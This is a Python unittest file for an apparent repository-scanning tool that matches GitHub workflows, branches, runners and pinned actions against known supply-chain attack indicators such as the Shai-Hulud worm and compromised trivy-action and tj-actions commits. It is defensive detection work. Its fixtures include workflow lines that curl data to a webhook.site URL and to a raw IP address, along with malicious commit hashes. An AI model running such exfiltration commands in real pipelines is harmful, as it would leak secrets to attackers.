"""Known attack indicators (iocs.yml): the file's own rules, and matching against a repository's
workflow files on every branch, branches, runs, runners, files, commit messages and pinned actions.

  uv run python -m unittest discover -s tests
"""
import os
import re
import tempfile
import unittest

from repostatus.checks import ioc_matching

TRIVY_BAD = "e0198fd2b6e1679e36d32933941182d9afa82f6f"  # one of the verified trivy-action commits


def repo(**kw):
    f = {"repo": "app", "description": "", "actions": {"items": []}, "branch_workflows": {"names": ["main"], "branches": []},
         "recent_runs": {"items": []}, "runners": {"names": []}, "ioc_paths": [], "workflow_history": {"items": []}}
    f.update(kw)
    return f


def saved(owner_dir, files):
    base = os.path.join(owner_dir, "workflows", "app", ".github", "workflows")
    os.makedirs(base, exist_ok=True)
    for name, text in files.items():
        with open(os.path.join(base, name), "w", encoding="utf-8") as fh:
            fh.write(text)


class TheFileItself(unittest.TestCase):
    """A careless edit to iocs.yml should fail the self-test, not silently match nothing."""

    def test_every_campaign_is_sourced_and_well_formed(self):
        iocs = ioc_matching.load_iocs()
        self.assertGreaterEqual(len(iocs["campaigns"]), 7)
        ids = [c["id"] for c in iocs["campaigns"]]
        self.assertEqual(len(ids), len(set(ids)), "campaign ids must be unique")
        for c in iocs["campaigns"]:
            self.assertTrue(c.get("name") and c.get("date") and c.get("sources"), c.get("id"))
            self.assertTrue(all(s.startswith("https://") for s in c["sources"]), c["id"])
            for rule in c.get("workflow_files") or []:
                self.assertTrue(rule.get("path") or rule.get("pattern"), c["id"])
                if rule.get("pattern"):
                    re.compile(rule["pattern"])
            for pat in c.get("branch_patterns") or []:
                re.compile(pat)
            for action, shas in (c.get("action_commits") or {}).items():
                self.assertRegex(action, r"^[\w.-]+/[\w.-]+$")
                for sha in shas:
                    self.assertRegex(sha, r"^[0-9a-f]{40}$", f"{c['id']} {action}")


class Matching(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)

    def hits(self, f):
        return [what for _, _, what in ioc_matching.match(f, self.tmp.name)]

    def test_shai_hulud_workflow_file_and_exfil_url(self):
        saved(self.tmp.name, {"shai-hulud-workflow.yml": "run: curl -d x https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7"})
        got = self.hits(repo())
        self.assertIn("workflow file .github/workflows/shai-hulud-workflow.yml (default branch)", got)
        self.assertTrue(any("webhook.site/bb8ca5f6" in h for h in got))

    def test_generic_names_need_a_specific_string(self):
        saved(self.tmp.name, {"discussion.yaml": "on: discussion\njobs: {a: {runs-on: ubuntu-latest}}",
                              "security-audit.yml": "run: npm audit"})
        self.assertEqual(self.hits(repo()), [])
        saved(self.tmp.name, {"discussion.yaml": "on: discussion\njobs: {a: {runs-on: self-hosted}}",
                              "security-audit.yml": "run: curl http://193.32.204.199:8080/?c=x"})
        got = self.hits(repo())
        self.assertTrue(any("discussion.yaml" in h for h in got))
        self.assertTrue(any("security-audit.yml" in h for h in got))

    def test_branches_runs_runners_files_and_messages(self):
        f = repo(branch_workflows={"names": ["main", "shai-hulud"], "branches": []},
                 recent_runs={"items": [{"path": ".github/workflows/formatter_123456789.yml",
                                         "head_branch": "add-linter-workflow-1732000000000", "created_at": "2025-11-24T00:00:00Z"}]},
                 runners={"names": ["SHA1HULUD"]}, ioc_paths=["setup_bun.js"],
                 workflow_history={"items": [{"headline": "Add Github Actions Security workflow"}]},
                 description="Sha1-Hulud: The Second Coming.")
        got = " | ".join(self.hits(f))
        for expected in ("branch shai-hulud", "formatter_123456789.yml ran on add-linter-workflow-1732000000000",
                         "branch add-linter-workflow-1732000000000", "self-hosted runner SHA1HULUD", "file setup_bun.js",
                         "commit message 'Add Github Actions Security workflow'",
                         "repository description 'Sha1-Hulud: The Second Coming'"):
            self.assertIn(expected, got)

    def test_pinned_to_a_malicious_commit(self):
        f = repo(actions={"items": [{"path": ".github/workflows/scan.yml", "uses": [
            {"kind": "action", "slug": "aquasecurity/trivy-action", "ref": TRIVY_BAD, "ref_type": "sha"}]}],
            "lockfile": {"dependencies": {"x": {"slug": "tj-actions/changed-files",
                                                "commit": "0e58ed8671d6b60d0890c21b07f8835ace038e67"}}}})
        got = " | ".join(self.hits(f))
        self.assertIn(f"aquasecurity/trivy-action pinned to malicious commit {TRIVY_BAD[:12]} in .github/workflows/scan.yml", got)
        self.assertIn("tj-actions/changed-files pinned to malicious commit 0e58ed8671d6 in actions.lock", got)

    def test_clean_repository(self):
        saved(self.tmp.name, {"ci.yml": "on: push\njobs: {b: {runs-on: ubuntu-latest, steps: [{run: make}]}}"})
        self.assertEqual(self.hits(repo()), [])


class ExposureWindow(unittest.TestCase):
    def test_tag_use_of_a_once_compromised_action(self):
        f = repo(actions={"items": [{"path": "x", "uses": [{"slug": "aquasecurity/trivy-action", "ref": "0.28.0",
                                                            "ref_type": "version"}]}]})
        flags = ioc_matching.ioc_flags(f)
        self.assertEqual([(c, s) for c, s, _ in flags], [("IOC_EXPOSURE_WINDOW", "info")])
        self.assertIn("2026-03-19T17:43", flags[0][2])
        f["actions"]["items"][0]["uses"][0].update(ref="a" * 40, ref_type="sha")
        self.assertEqual(ioc_matching.ioc_flags(f), [])


if __name__ == "__main__":
    unittest.main()
